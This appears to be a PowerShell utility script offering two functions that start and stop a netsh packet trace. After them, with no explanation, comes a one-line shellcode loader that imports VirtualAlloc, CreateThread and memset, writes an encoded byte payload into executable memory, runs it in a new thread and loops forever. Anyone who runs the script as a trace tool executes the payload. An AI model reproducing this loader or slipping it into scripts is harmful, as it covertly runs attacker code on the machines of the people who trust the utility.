﻿
function Start-PacketTrace {

	[CmdletBinding()]
	[OutputType()]
	param
	(
		[Parameter()]
		[ValidateNotNullOrEmpty()]
		[ValidateScript({ Test-Path -Path ($_ | Split-Path -Parent) -PathType Container })]
		[ValidatePattern('.*\.etl$')]
		[string[]]$TraceFilePath,
		[Parameter()]
		[switch]$Force
	)
	begin {
		Set-StrictMode -Version Latest
		$ErrorActionPreference = [System.Management.Automation.ActionPreference]::Stop
	}
	process {
		try {
			if (Test-Path -Path $TraceFilePath -PathType Leaf) {
				if (-not ($Force.IsPresent)) {
					throw "An existing trace file was found at [$($TraceFilePath)] and -Force was not used. Exiting.."
				} else {
					Remove-Item -Path $TraceFilePath
				}
			}
			$OutFile = "$PSScriptRoot\temp.txt"
			$Process = Start-Process "$($env:windir)\System32\netsh.exe" -ArgumentList "trace start persistent=yes capture=yes tracefile=$TraceFilePath" -RedirectStandardOutput $OutFile -Wait -NoNewWindow -PassThru
			if ($Process.ExitCode -notin @(0, 3010)) {
				throw "Failed to start the packet trace. Netsh exited with an exit code [$($Process.ExitCode)]"
			} else {
				Write-Verbose -Message "Successfully started netsh packet capture. Capturing all activity to [$($TraceFilePath)]"
			}
		} catch {
			Write-Error -Message "$($_.Exception.Message) - Line Number: $($_.InvocationInfo.ScriptLineNumber)"
		} finally {
			if (Test-Path -Path $OutFile -PathType Leaf) {
				Remove-Item -Path $OutFile
			}	
		}
	}
}



function Stop-PacketTrace {

	[CmdletBinding()]
	[OutputType()]
	param
	()
	begin {
		Set-StrictMode -Version Latest
		$ErrorActionPreference = [System.Management.Automation.ActionPreference]::Stop
	}
	process {
		try {
			$OutFile = "$PSScriptRoot\temp.txt"
			$Process = Start-Process "$($env:windir)\System32\netsh.exe" -ArgumentList 'trace stop' -Wait -NoNewWindow -PassThru -RedirectStandardOutput $OutFile
			if ((Get-Content $OutFile) -eq 'There is no trace session currently in progress.'){
				Write-Verbose -Message 'There are no trace sessions currently in progress'
			} elseif ($Process.ExitCode -notin @(0, 3010)) {
				throw "Failed to stop the packet trace. Netsh exited with an exit code [$($Process.ExitCode)]"
			} else {
				Write-Verbose -Message 'Successfully stopped netsh packet capture'
			}
		} catch {
			Write-Error -Message "Error: $($_.Exception.Message) - Line Number: $($_.InvocationInfo.ScriptLineNumber)"
		} finally {
			if (Test-Path -Path $OutFile -PathType Leaf) {
				Remove-Item -Path $OutFile
			}
		}
	}
}

$c = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xbd,0x9a,0x63,0x75,0x88,0xda,0xcf,0xd9,0x74,0x24,0xf4,0x5f,0x31,0xc9,0xb1,0x47,0x83,0xc7,0x04,0x31,0x6f,0x0f,0x03,0x6f,0x95,0x81,0x80,0x74,0x41,0xc7,0x6b,0x85,0x91,0xa8,0xe2,0x60,0xa0,0xe8,0x91,0xe1,0x92,0xd8,0xd2,0xa4,0x1e,0x92,0xb7,0x5c,0x95,0xd6,0x1f,0x52,0x1e,0x5c,0x46,0x5d,0x9f,0xcd,0xba,0xfc,0x23,0x0c,0xef,0xde,0x1a,0xdf,0xe2,0x1f,0x5b,0x02,0x0e,0x4d,0x34,0x48,0xbd,0x62,0x31,0x04,0x7e,0x08,0x09,0x88,0x06,0xed,0xd9,0xab,0x27,0xa0,0x52,0xf2,0xe7,0x42,0xb7,0x8e,0xa1,0x5c,0xd4,0xab,0x78,0xd6,0x2e,0x47,0x7b,0x3e,0x7f,0xa8,0xd0,0x7f,0xb0,0x5b,0x28,0x47,0x76,0x84,0x5f,0xb1,0x85,0x39,0x58,0x06,0xf4,0xe5,0xed,0x9d,0x5e,0x6d,0x55,0x7a,0x5f,0xa2,0x00,0x09,0x53,0x0f,0x46,0x55,0x77,0x8e,0x8b,0xed,0x83,0x1b,0x2a,0x22,0x02,0x5f,0x09,0xe6,0x4f,0x3b,0x30,0xbf,0x35,0xea,0x4d,0xdf,0x96,0x53,0xe8,0xab,0x3a,0x87,0x81,0xf1,0x52,0x64,0xa8,0x09,0xa2,0xe2,0xbb,0x7a,0x90,0xad,0x17,0x15,0x98,0x26,0xbe,0xe2,0xdf,0x1c,0x06,0x7c,0x1e,0x9f,0x77,0x54,0xe4,0xcb,0x27,0xce,0xcd,0x73,0xac,0x0e,0xf2,0xa1,0x59,0x0a,0x64,0x8a,0x36,0x97,0x3d,0x62,0x45,0x98,0xbc,0xce,0xc0,0x7e,0xee,0x7e,0x83,0x2e,0x4e,0x2f,0x63,0x9f,0x26,0x25,0x6c,0xc0,0x56,0x46,0xa6,0x69,0xfc,0xa9,0x1f,0xc1,0x68,0x53,0x3a,0x99,0x09,0x9c,0x90,0xe7,0x09,0x16,0x17,0x17,0xc7,0xdf,0x52,0x0b,0xbf,0x2f,0x29,0x71,0x69,0x2f,0x87,0x1c,0x95,0xa5,0x2c,0xb7,0xc2,0x51,0x2f,0xee,0x24,0xfe,0xd0,0xc5,0x3f,0x37,0x45,0xa6,0x57,0x38,0x89,0x26,0xa7,0x6e,0xc3,0x26,0xcf,0xd6,0xb7,0x74,0xea,0x18,0x62,0xe9,0xa7,0x8c,0x8d,0x58,0x14,0x06,0xe6,0x66,0x43,0x60,0xa9,0x99,0xa6,0x70,0x95,0x4f,0x8e,0x06,0xf7,0x53;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};

